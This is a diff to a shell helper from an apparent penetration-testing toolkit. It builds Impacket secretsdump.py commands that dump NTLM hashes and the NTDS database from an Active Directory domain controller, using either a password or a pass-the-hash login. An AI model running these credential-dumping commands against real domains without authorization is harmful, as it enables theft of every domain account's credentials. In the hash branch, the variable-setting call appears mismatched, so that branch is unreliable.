@@ -26,9 +26,11 @@ nb-ad-dump-hash-install() {
 
 nb-ad-dump-hash-secrets() {
     __check-project
-    __check-network
     __check-domain
     __check-user
+
+    __ask "Provide IP of domain controller"
+    nb-vars-set-rhost
     echo
 
     __ask "Do you want to log in using a password or a hash? (p/h)"
@@ -52,7 +54,6 @@ nb-ad-dump-hash-secrets() {
 
 nb-ad-dump-hash-ntds() {
     __check-project
-    __check-network
     __check-domain
 
     # ask for domain admin user credentials
@@ -65,17 +66,16 @@ nb-ad-dump-hash-ntds() {
 
     if [[ $login == "p" ]]; then
         echo
-        __ask "Enter a password for authentication"
-        __check-pass
+        __ask "Enter a domain admin password for authentication"
+        nb-vars-set-pass
         print -z "secretsdump.py ${__DOMAIN}/${__USER}:"${__PASS}"@${__RHOST} -just-dc-ntlm | tee -a ${__domainadpath}/NTDS-hashdump.txt"
     elif [[ $login == "h" ]]; then
         echo
-        __ask "Enter the NTLM hash for authentication"
-        __check-hash
-        print -z "secretsdump.py ${__USER}@${__RHOST} -hashes ${__HASH} | tee -a ${__domainadpath}/${__USER}-hashdump.txt"
+        __ask "Enter the domain admin NTLM hash for authentication"
+        nb-vars-set-pass
+        print -z "secretsdump.py ${__USER}@${__RHOST} -hashes ${__HASH} -just-dc-ntlm | tee -a ${__domainadpath}/NTDS-hashdump.txt"
     else
         echo
         __err "Invalid option. Please choose 'p' for password or 'h' for hash."
     fi
-
 }
